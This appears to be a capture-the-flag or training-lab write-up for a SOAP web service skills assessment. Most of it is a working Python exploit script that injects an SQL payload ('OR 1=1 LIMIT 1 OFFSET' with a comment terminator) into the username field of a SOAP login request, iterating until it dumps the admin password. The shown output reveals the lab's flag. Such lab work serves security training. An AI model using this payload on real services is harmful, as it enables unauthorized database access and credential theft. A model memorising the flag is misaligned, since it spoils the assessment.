# Web Service & API Attacks - Skills Assessment

Our client tasks us with assessing a SOAP web service whose WSDL file resides at `http://<TARGET IP>:3002/wsdl?wsdl`.

Assess the target, identify an SQL Injection vulnerability through SOAP messages and answer the question below.

**Questions**

Submit the password of the user that has a username of "admin". Answer format: FLAG{string}. Please note that the service will respond successfully only after submitting the proper SQLi payload, otherwise it will hang or throw an error.

```python
#vim exploit.py
import requests, sys
import xml.etree.ElementTree as ET

for i in range(100):
    craft= f"""OR 1=1 LIMIT 1 OFFSET {i}"""
    payload = f"""
             <?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope
                    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xmlns:tns="http://tempuri.org/"
                    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
                    <soap:Body>
                       <LoginRequest xmlns="http://tempuri.org/">
                          <username> admin'{craft}-- - </username>
                          <password> password </password>
                       </LoginRequest>
                    </soap:Body>
                </soap:Envelope>
            """

    res = requests.post("http://10.129.201.198:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'})
    if "admin" in res.content.decode():
        print(res.request.body)
        print("\n"+ res.text)
        sys.exit(0)
```

now run the exploit

```bash
python3 exploit.py
#<password>FLAG{1337_SQL_INJECTION_IS_FUN_:)}</password>
```
